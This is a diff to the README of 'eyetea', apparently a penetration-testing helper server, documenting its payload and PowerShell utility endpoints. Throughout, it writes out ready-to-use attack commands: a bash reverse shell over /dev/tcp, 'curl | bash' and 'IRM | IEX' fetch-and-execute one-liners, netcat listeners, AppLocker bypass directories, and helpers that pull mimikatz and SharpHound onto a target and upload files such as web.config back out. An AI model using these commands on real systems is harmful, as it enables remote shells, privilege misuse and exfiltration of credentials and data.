@@ -194,15 +194,15 @@ Here is an example of thoses contexts for a bash reverse shell payload:
 
 ```shell
 # the command to run on the host to catch the reverse shell
-$ curl http://127.0.0.1/ph/r/sh/bash/4444
+$ curl http://127.0.0.1/ph/sh/r/bash/4444
 rlwrap nc -lvp 4444 -s 127.0.0.1
 
 # the command to run on the target to execute the reverse shell
-$ curl http://127.0.0.1/pt/r/sh/bash/4444
+$ curl http://127.0.0.1/pt/sh/r/bash/4444
 curl http://127.0.0.1/sh/r/bash/4444 | bash
 
 # the actual reverse shell payload that gets executed
-$ curl http://127.0.0.1/pe/r/sh/bash/4444
+$ curl http://127.0.0.1/pe/sh/r/bash/4444
 bash -i > /dev/tcp/127.0.0.1/4444 0<&1 2>&1
 ```
 
@@ -212,7 +212,7 @@ reverse shell payload:
 
 ```shell
 # `/p<context>:b64` for base64 encoding
-$ curl http://127.0.0.1/pt:u/r/sh/bash/4444
+$ curl http://127.0.0.1/pt:u/sh/r/bash/4444
 curl+http%3A%2F%2F127.0.0.1%2Fsh%2Fr%2Fbash%2F4444+%7C+bash
 ```
 
@@ -222,7 +222,7 @@ A command to start a listener to catch a given reverse shell payload can be
 retrieved using the pastables endpoint as shown in the previous section:
 
 ```shell
-$ curl http://127.0.0.1/ph/r/sh/bash/4444
+$ curl http://127.0.0.1/ph/sh/r/bash/4444
 rlwrap nc -lvp 4444 -s 127.0.0.1
 ```
 
@@ -231,4 +231,94 @@ shell payload is requested from a target, `eyetea` will spawn a new terminal
 and execute a listener to catch the requested payload. This is done by
 starting a `socat` listener at the requested port before `eyetea` returns the
 reverse shell payload to be executed on the target.
+
+### Shell utilities
+
+`eyetea` provides an endpoint to retrieve a shell script that can be imported
+into a shell session that provides functions to make interacting with the
+`eyetea` server from a remote host easier. Currently only PowerShell on Windows
+is supported.
+
+#### Windows
+
+##### Powershell
+
+To source the utility script into a PowerShell session, first on your local
+host hit the following endpoint to retrieve the pastable command to run in the
+remote shell:
+
+```shell
+$ curl -s http://127.0.0.1/pt/sh/u/powershell:windows
+IRM -Uri 'http://127.0.0.1/sh/u/powershell:windows' | IEX
+```
+
+Then, paste and run the command in the remote PowerShell session:
+
+```powershell
+$ IRM -Uri 'http://127.0.0.1/sh/u/powershell:windows' | IEX
+```
+
+The following functions are now available.
+
+###### `Bypass-Path`
+
+Searchs for a writable directory that can be used to [bypass AppLocker
+Policies][applocker-bypass]. Currently the following paths are checked:
+
+- `C:\Windows\System32\spool\drivers\color`
+- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
+- `C:\Windows\Tasks`
+- `C:\Windows\tracing`
+
+```powershell
+$ Bypass-Path | cd
+```
+
+###### `Download-Files`
+
+Wraps `Invoke-WebRequest`, downloading the given files to the current working
+directory from the `eyetea` server's download directory if it was started with
+the `-d` option.
+
+```powershell
+# single file
+$ Download-Files mimikatz.exe
+
+# multiple files
+$ Download-Files RunasCs.exe, SharpHound.exe
+
+# file in sudirectory (will be stripped when written locally) on the eyetea
+# server
+$ Download-Files ProcessExplorer/procexp64.exe
+```
+
+###### `Runas-Command`
+
+Wraps [RunasCs][runascs], to make calling with the `-r` more convient. The
+`RunasCs.exe` binary must be present in the current working directory for this
+function to work.
+
+```powershell
+$ Runas-Command -Remote Administrator password powershell.exe
+$ Runas-Command -Domain htb User password 'cmd.exe /c whoami'
+```
+
+###### `Upload-Files`
+
+Wraps `curl` (which must be present on the system and on the `$PATH`),
+uploading the given files to the `eyetea` server's upload directory if it was
+started with the `-u` option.
+
+
+```powershell
+# single file
+$ Upload-Files local.txt
+
+# mutliple files
+$ Upload-Files C:\inetpub\wwwroot\web.config, interesting.ps1
+```
+
+
+[applocker-bypass]: https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs#bypass
+[runascs]: https://github.com/antonioCoco/RunasCs
 
